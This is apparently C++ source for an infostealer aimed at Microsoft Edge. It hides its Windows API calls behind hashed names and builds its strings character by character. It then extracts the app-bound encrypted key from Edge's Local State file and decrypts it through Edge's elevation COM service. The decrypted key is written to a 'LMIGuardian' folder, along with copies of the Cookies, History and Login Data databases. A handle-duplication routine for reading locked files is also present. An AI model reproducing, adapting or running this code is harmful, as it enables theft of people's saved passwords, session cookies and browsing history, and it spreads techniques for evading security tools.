// dllmain.cpp : Defines the entry point for the DLL application.
#include "Base64.h"
#include "ApiResolve.h"
#include "HashString.h"
#include "CRT.h"

typedef enum _PROTECTION_LEVEL
{
    PROTECTION_NONE = 0,
    PROTECTION_PATH_VALIDATION_OLD = 1,
    PROTECTION_PATH_VALIDATION = 2,
    PROTECTION_MAX = 3

} PROTECTION_LEVEL;

typedef struct IElevatorEdge IElevatorEdge;

typedef struct IElevatorEdgeVtbl
{
    // IUnknown (vtable slots 0-2)
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IElevatorEdge* This, REFIID riid, void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef)(IElevatorEdge* This);
    ULONG(STDMETHODCALLTYPE* Release)(IElevatorEdge* This);

    // Edge base interface placeholders (vtable slots 3-5)
    HRESULT(STDMETHODCALLTYPE* _Placeholder1)(IElevatorEdge* This);
    HRESULT(STDMETHODCALLTYPE* _Placeholder2)(IElevatorEdge* This);
    HRESULT(STDMETHODCALLTYPE* _Placeholder3)(IElevatorEdge* This);

    // IElevator methods (vtable slots 6-8)
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(
        IElevatorEdge* This,
        const WCHAR* crx_path,
        const WCHAR* browser_appid,
        const WCHAR* browser_version,
        const WCHAR* session_id,
        DWORD           caller_proc_id,
        ULONG_PTR* proc_handle
        );

    HRESULT(STDMETHODCALLTYPE* EncryptData)(
        IElevatorEdge* This,
        PROTECTION_LEVEL    protection_level,
        const BSTR          plaintext,
        BSTR* ciphertext,
        DWORD* last_error
        );

    HRESULT(STDMETHODCALLTYPE* DecryptData)(
        IElevatorEdge* This,
        const BSTR      ciphertext,
        BSTR* plaintext,
        DWORD* last_error
        );

} IElevatorEdgeVtbl;

struct IElevatorEdge
{
    IElevatorEdgeVtbl* lpVtbl;
};

#define SystemExtendedHandleInformation 64
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX;


bool CreateCopyFile(char* filename, char* newFileName) {
    ApiResolve apiResolve;
    constexpr unsigned int hashKernel32 = ComplexHashForWChar(L"kernel32.dll");

    LPVOID lpKernel32 = apiResolve.GetModuleBaseAddress(hashKernel32);

    constexpr unsigned int hashGetLastError = ComplexHashForAnsi("GetLastError");
    typedef DWORD(WINAPI* _GetLastError)();
    _GetLastError pGetLastError = (_GetLastError)apiResolve.GetApiAddress(lpKernel32, hashGetLastError);

    constexpr unsigned int hashCloseHandle = ComplexHashForAnsi("CloseHandle");
    typedef BOOL(WINAPI* _CloseHandle)(HANDLE);
    _CloseHandle pCloseHandle = (_CloseHandle)apiResolve.GetApiAddress(lpKernel32, hashCloseHandle);

    constexpr unsigned int hashNtdll = ComplexHashForWChar(L"ntdll.dll");
    LPVOID lpNtdll = apiResolve.GetModuleBaseAddress(hashNtdll);

    constexpr unsigned int hashNtQuerySystemInformation = ComplexHashForAnsi("NtQuerySystemInformation");
    typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
        ULONG,
        PVOID,
        ULONG,
        PULONG
        );

    _NtQuerySystemInformation pNtQuerySystemInformation = (_NtQuerySystemInformation)apiResolve.GetApiAddress(lpNtdll, hashNtQuerySystemInformation);

    ULONG size = 0x10000;
    LPVOID handleInfoBuffer = nullptr;
    NTSTATUS status;

    do {
        AllocMemory(size, &handleInfoBuffer);

        status = pNtQuerySystemInformation(
            SystemExtendedHandleInformation,
            handleInfoBuffer,
            size,
            &size
        );

        if (status == STATUS_INFO_LENGTH_MISMATCH)
            size *= 2;

    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (status < 0) {
        return 1;
    }

    auto info = (SYSTEM_HANDLE_INFORMATION_EX*)handleInfoBuffer;
    for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++) {
        auto& h = info->Handles[i];
        HANDLE handle = (HANDLE)h.HandleValue;

        char path[MAX_PATH] = { 0 };
        constexpr unsigned int hashGetFinalPathNameByHandleA = ComplexHashForAnsi("GetFinalPathNameByHandleA");
        typedef DWORD(WINAPI* _GetFinalPathNameByHandleA)(
            HANDLE,
            LPSTR,
            DWORD,
            DWORD
            );
        _GetFinalPathNameByHandleA pGetFinalPathNameByHandleA = (_GetFinalPathNameByHandleA)apiResolve.GetApiAddress(lpKernel32, hashGetFinalPathNameByHandleA);
        DWORD len = pGetFinalPathNameByHandleA(
            handle,
            path,
            MAX_PATH,
            FILE_NAME_NORMALIZED
        );

        if (len == 0 || len >= MAX_PATH)
            continue;

        //char pattern[] = "test.txt\0";
        char* pointer = NULL;
        FindPatternA(path, filename, StrLen(filename), &pointer);
        if (pointer == NULL) {
            continue;
        }
        pCloseHandle(handle);
        return 1;
        constexpr unsigned int hashOpenProcess = ComplexHashForAnsi("OpenProcess");
        typedef HANDLE(WINAPI* _OpenProcess)(DWORD, BOOL, DWORD);
        _OpenProcess pOpenProcess = (_OpenProcess)apiResolve.GetApiAddress(lpKernel32, hashOpenProcess);
        HANDLE hProc = pOpenProcess(PROCESS_DUP_HANDLE, FALSE, (DWORD)h.UniqueProcessId);
        if (!hProc) {
            continue;
        }

        HANDLE hCopy = NULL;
        constexpr unsigned int hashDuplicateHandle = ComplexHashForAnsi("DuplicateHandle");
        typedef BOOL(WINAPI* _DuplicateHandle)(
            HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD
            );
        _DuplicateHandle pDuplicateHandle = (_DuplicateHandle)apiResolve.GetApiAddress(lpKernel32, hashDuplicateHandle);
        BOOL dupOk = pDuplicateHandle(
            (HANDLE)hProc,
            handle,
            (HANDLE)-1,
            &hCopy,
            GENERIC_READ,
            FALSE,
            0
        );

        //pCloseHandle(hProc);
        if (!dupOk) {
            continue;
        }

        constexpr unsigned int hashCreateFileA = ComplexHashForAnsi("CreateFileA");
        typedef HANDLE(WINAPI* _CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
        _CreateFileA pCreateFileA = (_CreateFileA)apiResolve.GetApiAddress(lpKernel32, hashCreateFileA);
        HANDLE hOut = pCreateFileA(
            newFileName,
            GENERIC_WRITE,
            0,
            NULL,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (hOut == INVALID_HANDLE_VALUE) {
            pCloseHandle(hCopy);
            return 1;
        }


        char buffer[4096];
        DWORD bytesRead = 0;
        DWORD bytesWritten = 0;

        ULONGLONG offset = 0;

        while (true) {
            OVERLAPPED ov = {};
            ov.Offset = (DWORD)(offset & 0xFFFFFFFF);
            ov.OffsetHigh = (DWORD)(offset >> 32);

            constexpr unsigned int hashReadFile = ComplexHashForAnsi("ReadFile");
            typedef BOOL(WINAPI* _ReadFile)(
                HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED
                );
            _ReadFile pReadFile = (_ReadFile)apiResolve.GetApiAddress(lpKernel32, hashReadFile);
            BOOL ok = pReadFile(
                hCopy,
                buffer,
                sizeof(buffer),
                &bytesRead,
                &ov
            );

            if (!ok) {
                DWORD err = pGetLastError();

                if (err == ERROR_HANDLE_EOF)
                    break;
                break;
            }

            if (bytesRead == 0)
                break;

            constexpr unsigned int hashWriteFile = ComplexHashForAnsi("WriteFile");
            typedef BOOL(WINAPI* _WriteFile)(
                HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED
                );
            _WriteFile pWriteFile = (_WriteFile)apiResolve.GetApiAddress(lpKernel32, hashWriteFile);
            if (!pWriteFile(hOut, buffer, bytesRead, &bytesWritten, NULL)) {
                break;
            }

            offset += bytesRead;
        }

        pCloseHandle(hCopy);
        pCloseHandle(hOut);
        break;
    }

    FreeMemory(handleInfoBuffer);
    return 1;
}

void DecryptKey() {
    CLSID EdgeCLSID = { 0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67} };
    IID EdgeIID = { 0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B} };
    IElevatorEdge* pElevatorEdge = NULL;
    HRESULT hr;

    ApiResolve apiResolve;
    constexpr unsigned int hashKernel32 = ComplexHashForWChar(L"kernel32.dll");
    LPVOID lpKernel32 = apiResolve.GetModuleBaseAddress(hashKernel32);
    if (!lpKernel32) {
        return;
    }

    typedef HMODULE(WINAPI* _LoadLibraryA)(LPCSTR lpLibFileName);
    constexpr unsigned int hashLoadLibraryA = ComplexHashForAnsi("LoadLibraryA");
    _LoadLibraryA pLoadLibraryA = (_LoadLibraryA)apiResolve.GetApiAddress(lpKernel32, hashLoadLibraryA);
    if (!pLoadLibraryA) {
        return;
    }

    char sOle32[] = {'O', 'l', 'e', '3', '2', '.', 'd', 'l', 'l', '\0'};
    HMODULE hOle32 = pLoadLibraryA(sOle32);

    char sUser32[] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', '\0' };
    HMODULE hUser32 = pLoadLibraryA(sUser32);

    char sShell32[] = { 'S', 'h', 'e', 'l', 'l', '3', '2', '.', 'd', 'l', 'l', '\0' };
    HMODULE hShell32 = pLoadLibraryA(sShell32);
    typedef HRESULT(WINAPI* _SHGetFolderPathA)(
        HWND   hwnd,
        int    csidl,
        HANDLE hToken,
        DWORD  dwFlags,
        LPSTR  pszPath
        );
    constexpr unsigned int hashSHGetFolderPathA = ComplexHashForAnsi("SHGetFolderPathA");
    _SHGetFolderPathA pSHGetFolderPathA = (_SHGetFolderPathA)apiResolve.GetApiAddress(hShell32, hashSHGetFolderPathA);
    if (!pSHGetFolderPathA) { return; }
    char path[MAX_PATH] = { 0 };
    if (pSHGetFolderPathA(NULL, 0x001c, NULL, 0, path) != S_OK) {
        return;
    }
    
    char pathEdge[MAX_PATH] = { 0 };
    CopyStringA(path, pathEdge, MAX_PATH);
    char sSubEdge[] = {
        '\\','M','i','c','r','o','s','o','f','t','\\',
        'E','d','g','e','\\',
        'U','s','e','r',' ','D','a','t','a', '\\',
        'D', 'e', 'f', 'a', 'u', 'l', 't',
        '\0'
    };
    CopyStringA(sSubEdge, pathEdge + StrLen(pathEdge), MAX_PATH - StrLen(pathEdge));

    char sLocalState[] = {
        '\\','M','i','c','r','o','s','o','f','t','\\',
        'E','d','g','e','\\',
        'U','s','e','r',' ','D','a','t','a','\\',
        'L','o','c','a','l',' ','S','t','a','t','e',
        '\0'
        };
    int size = StrLen(path);
    CopyStringA(sLocalState, path + StrLen(path), MAX_PATH - StrLen(path));

    char pathMal[MAX_PATH] = { 0 };
    if (pSHGetFolderPathA(NULL, 0x001a, NULL, 0, pathMal)) {
        return;
    }
    char sMal[] = {
        '\\', 'L', 'M', 'I', 'G', 'u', 'a', 'r', 'd', 'i', 'a', 'n', '\0'
    };

    char keyPath[MAX_PATH] = { 0 };
    char cookiesPath[MAX_PATH] = { 0 };
    char historyPath[MAX_PATH] = { 0 };
    char passwordPath[MAX_PATH] = { 0 };

    CopyStringA(sMal, pathMal + StrLen(pathMal), MAX_PATH - StrLen(sMal));

    CopyStringA(pathMal, keyPath, MAX_PATH);
    char keyFileName[] = { '\\', 'b', 'r', 'o', 'w', 's', 'e', 'r', 'k', 'e', 'y', '.', 'd', 'b', '\0' };
    CopyStringA(keyFileName, keyPath + StrLen(keyPath), MAX_PATH - StrLen(keyPath));

    CopyStringA(pathMal, cookiesPath, MAX_PATH);
    CopyStringA(pathMal, historyPath, MAX_PATH);
    CopyStringA(pathMal, passwordPath, MAX_PATH);
    char historyFilename[] = {'\\', 'H', 'i', 's', 't', 'o', 'r', 'y', '\0'};
    char cookiesFilename[] = {'\\', 'C', 'o', 'o', 'k', 'i', 'e', 's', '\0' };
    char passwordFilename[] = {'\\', 'L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a', '\0' };

    CopyStringA(cookiesFilename, cookiesPath + StrLen(cookiesPath), MAX_PATH - StrLen(cookiesPath));
    CopyStringA(historyFilename, historyPath + StrLen(historyPath), MAX_PATH - StrLen(historyPath));
    CopyStringA(passwordFilename, passwordPath + StrLen(passwordPath), MAX_PATH - StrLen(passwordPath));

    char orCookiesPath[MAX_PATH] = { 0 };
    char orHistoryPath[MAX_PATH] = { 0 };
    char orPasswordPath[MAX_PATH] = { 0 };
    CopyStringA(pathEdge, orCookiesPath, MAX_PATH);
    CopyStringA(pathEdge, orHistoryPath, MAX_PATH);
    CopyStringA(pathEdge, orPasswordPath, MAX_PATH);

    char network[] = { '\\', 'N', 'e', 't', 'w', 'o', 'r', 'k', '\0' };

    CopyStringA(network, orCookiesPath + StrLen(orCookiesPath), MAX_PATH - StrLen(orCookiesPath));
    CopyStringA(cookiesFilename, orCookiesPath + StrLen(orCookiesPath), MAX_PATH - StrLen(orCookiesPath));
    CopyStringA(historyFilename, orHistoryPath + StrLen(orHistoryPath), MAX_PATH - StrLen(orHistoryPath));
    CopyStringA(passwordFilename, orPasswordPath + StrLen(orPasswordPath), MAX_PATH - StrLen(orPasswordPath));

    typedef HANDLE(WINAPI* _CreateFileA)(
        LPCSTR                lpFileName,
        DWORD                 dwDesiredAccess,
        DWORD                 dwShareMode,
        LPSECURITY_ATTRIBUTES lpSecurityAttributes,
        DWORD                 dwCreationDisposition,
        DWORD                 dwFlagsAndAttributes,
        HANDLE                hTemplateFile
        );
    constexpr unsigned int hashCreateFileA = ComplexHashForAnsi("CreateFileA");
    _CreateFileA pCreateFileA = (_CreateFileA)apiResolve.GetApiAddress(lpKernel32, hashCreateFileA);
    if (!pCreateFileA) { return; }
    HANDLE hFile = pCreateFileA((LPCSTR)path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!hFile) { return; }

    typedef DWORD(WINAPI* _GetFileSize)(HANDLE, LPDWORD);
    constexpr unsigned int hashGetFileSize = ComplexHashForAnsi("GetFileSize");
    _GetFileSize pGetFileSize = (_GetFileSize)apiResolve.GetApiAddress(lpKernel32, hashGetFileSize);
    if (!pGetFileSize) { return; }
    DWORD dwFileSize = pGetFileSize(hFile, NULL);
    if (dwFileSize == 0) { return; }

    LPVOID fileBuf = NULL;
    if (!AllocMemory(dwFileSize + 1, &fileBuf)) {
        return;
    }

    typedef BOOL(WINAPI* _ReadFile)(
        HANDLE       hFile,
        LPVOID       lpBuffer,
        DWORD        nNumberOfBytesToRead,
        LPDWORD      lpNumberOfBytesRead,
        LPOVERLAPPED lpOverlapped
    );
    constexpr unsigned int hashReadFile = ComplexHashForAnsi("ReadFile");
    _ReadFile pReadFile = (_ReadFile)apiResolve.GetApiAddress(lpKernel32, hashReadFile);
    if (!pReadFile) { return; }
    if (!pReadFile(hFile, fileBuf, dwFileSize, NULL, NULL)) {
        return;
    }

    typedef BOOL(WINAPI* _CloseHandle)(HANDLE);
    constexpr unsigned int hashCloseHandle = ComplexHashForAnsi("CloseHandle");
    _CloseHandle pCloseHandle = (_CloseHandle)apiResolve.GetApiAddress(lpKernel32, hashCloseHandle);
    if (!pCloseHandle) { return; }

    pCloseHandle(hFile);

    char patternKey[] = { 'a', 'p', 'p', '_', 'b', 'o', 'u', 'n', 'd', '_', 'e', 'n', 'c', 'r', 'y', 'p', 't', 'e', 'd', '_', 'k', 'e', 'y', '"', ':', '"', '\0'};
    char* keyPointer = NULL;
    if (!FindPatternA((char*)fileBuf, patternKey, StrLen(patternKey), &keyPointer)) { return; }
    keyPointer = keyPointer + StrLen(patternKey);
    int sizeKeyB64 = 0;
    for (int i = 0; ;i++) {
        if (keyPointer[i] == '"') {
            keyPointer[i] = '\0';
            break;
        }
        i++;
        sizeKeyB64++;
    }

    typedef HRESULT (WINAPI* _CoInitializeEx)(
        LPVOID pvReserved,
        DWORD  dwCoInit
    );

    constexpr unsigned int hashCoInitializeEx = ComplexHashForAnsi("CoInitializeEx");
    _CoInitializeEx pCoInitializeEx = (_CoInitializeEx)apiResolve.GetApiAddress(hOle32, hashCoInitializeEx);
    if (!pCoInitializeEx) {
        return;
    }

    hr = pCoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        return;
    }

    typedef void (WINAPI* _CoUninitialize)();
    constexpr unsigned int hashCoUninitialize = ComplexHashForAnsi("CoUninitialize");
    _CoUninitialize pCoUninitialize = (_CoUninitialize)apiResolve.GetApiAddress(hOle32, hashCoUninitialize);
    if (!pCoUninitialize) { return; }

    typedef HRESULT(WINAPI* _CoCreateInstance) (REFCLSID  rclsid,
        LPUNKNOWN pUnkOuter,
        DWORD     dwClsContext,
        REFIID    riid,
        LPVOID* ppv);
    constexpr unsigned int hashCoCreateInstance = ComplexHashForAnsi("CoCreateInstance");
    _CoCreateInstance pCoCreateInstance = (_CoCreateInstance)apiResolve.GetApiAddress(hOle32, hashCoCreateInstance);
    if (!pCoCreateInstance) { return; }
    hr = pCoCreateInstance(
        EdgeCLSID,
        nullptr,
        CLSCTX_LOCAL_SERVER,
        EdgeIID,
        reinterpret_cast<void**>(&pElevatorEdge)
    );

    if (FAILED(hr)) {
        pCoUninitialize();
        return;
    }

    typedef HRESULT(WINAPI* _CoSetProxyBlanket)(
        IUnknown* pProxy,
        DWORD                    dwAuthnSvc,
        DWORD                    dwAuthzSvc,
        OLECHAR* pServerPrincName,
        DWORD                    dwAuthnLevel,
        DWORD                    dwImpLevel,
        RPC_AUTH_IDENTITY_HANDLE pAuthInfo,
        DWORD                    dwCapabilities
        );

    constexpr unsigned int hashCoSetProxyBlanket = ComplexHashForAnsi("CoSetProxyBlanket");
    _CoSetProxyBlanket pCoSetProxyBlanket = (_CoSetProxyBlanket)apiResolve.GetApiAddress(hOle32, hashCoSetProxyBlanket);
    if (!pCoSetProxyBlanket) { return; }
    hr = pCoSetProxyBlanket(
        (IUnknown*)pElevatorEdge,
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_DYNAMIC_CLOAKING
    );

    BSTR decryptedDataBSTR = NULL;
    DWORD dwLastError = 0;
    int length = 0;
    char* encKey = Base64Decode(keyPointer, length);
    char sOleAut32[] = { 'O', 'l', 'e', 'A', 'u', 't', '3', '2', '.', 'd', 'l', 'l', '\0' };
    HMODULE hOleAut32 = pLoadLibraryA(sOleAut32);
    if (!hOleAut32) { return; }

    typedef BSTR(WINAPI* _SysAllocStringByteLen)(LPCSTR psz, UINT len);
    constexpr unsigned int hashSysAllocStringByteLen = ComplexHashForAnsi("SysAllocStringByteLen");
    _SysAllocStringByteLen pSysAllocStringByteLen = (_SysAllocStringByteLen)apiResolve.GetApiAddress(hOleAut32, hashSysAllocStringByteLen);
    if (!pSysAllocStringByteLen) { return; }
    
    typedef UINT(WINAPI* _SysStringByteLen)(BSTR);
    constexpr unsigned int hashSysStringByteLen = ComplexHashForAnsi("SysStringByteLen");
    _SysStringByteLen pSysStringByteLen = (_SysStringByteLen)apiResolve.GetApiAddress(hOleAut32, hashSysStringByteLen);
    if (!pSysStringByteLen) { return; }

    typedef void (WINAPI* _SysFreeString)(BSTR bstrString);
    constexpr unsigned int hashSysFreeString = ComplexHashForAnsi("SysFreeString");
    _SysFreeString pSysFreeString = (_SysFreeString)apiResolve.GetApiAddress(hOleAut32, hashSysFreeString);
    if (!pSysFreeString) { return; }
    BSTR bstrEncKey = pSysAllocStringByteLen(encKey + 4, length - 4);
    hr = pElevatorEdge->lpVtbl->DecryptData(pElevatorEdge, bstrEncKey, &decryptedDataBSTR, &dwLastError);
    if (bstrEncKey) {
        pSysFreeString(bstrEncKey);
    }

    if (FAILED(hr)) {
        return;
    }
    else {
        typedef BOOL(WINAPI* _WriteFile)(
            HANDLE       hFile,
            LPCVOID      lpBuffer,
            DWORD        nNumberOfBytesToWrite,
            LPDWORD      lpNumberOfBytesWritten,
            LPOVERLAPPED lpOverlapped
            );
        constexpr unsigned int hashWriteFile = ComplexHashForAnsi("WriteFile");
        _WriteFile pWriteFile = (_WriteFile)apiResolve.GetApiAddress(lpKernel32, hashWriteFile);
        if (!pWriteFile) { return; }
        //Write key to file in desktop
        //char keyFileName[] = { 'b', 'r', 'o', 'w', 's', 'e', 'r', 'k', 'e', 'y', '\0' };
        //CopyStringA(keyFileName, pathMal + StrLen(pathMal), MAX_PATH - StrLen(pathMal));
        HANDLE hFile = pCreateFileA(keyPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        pWriteFile(hFile, decryptedDataBSTR, pSysStringByteLen(decryptedDataBSTR), NULL, NULL);

        constexpr unsigned int hashCopyFileA = ComplexHashForAnsi("CopyFileA");
        typedef BOOL (WINAPI* _CopyFileA)(
            LPCSTR lpExistingFileName,
            LPCSTR lpNewFileName,
            BOOL   bFailIfExists
        );
        _CopyFileA pCopyFileA = (_CopyFileA)apiResolve.GetApiAddress(lpKernel32, hashCopyFileA);
        if (!pCopyFileA) { return; }
        
        //CreateCopyFile(cookiesFilename, cookiesPath);
        //CreateCopyFile(historyFilename, historyPath);
        //CreateCopyFile(passwordFilename, passwordPath);

        if (!pCopyFileA(orCookiesPath, cookiesPath, FALSE)) {
            
        }

        if (!pCopyFileA(orHistoryPath, historyPath, FALSE)) {
            
        }

        if (pCopyFileA(orPasswordPath, passwordPath, FALSE)) {
            
        }
        
        //CreateCopyFile(historyFilename, historyPath);
        //CreateCopyFile(cookiesFilename, cookiesPath);
        //CreateCopyFile(passwordFilename, passwordPath);

        pSysFreeString(decryptedDataBSTR);
        pCloseHandle(hFile);
    }

    FreeMemory(fileBuf);
    //constexpr unsigned int hashExitThread = ComplexHashForAnsi("ExitThread");
    //typedef VOID(WINAPI* _ExitThread)(DWORD);
    //_ExitThread pExitThread = (_ExitThread)apiResolve.GetApiAddress(lpKernel32, hashExitThread);
    //pExitThread(0);
}

int main() {
    DecryptKey();
}
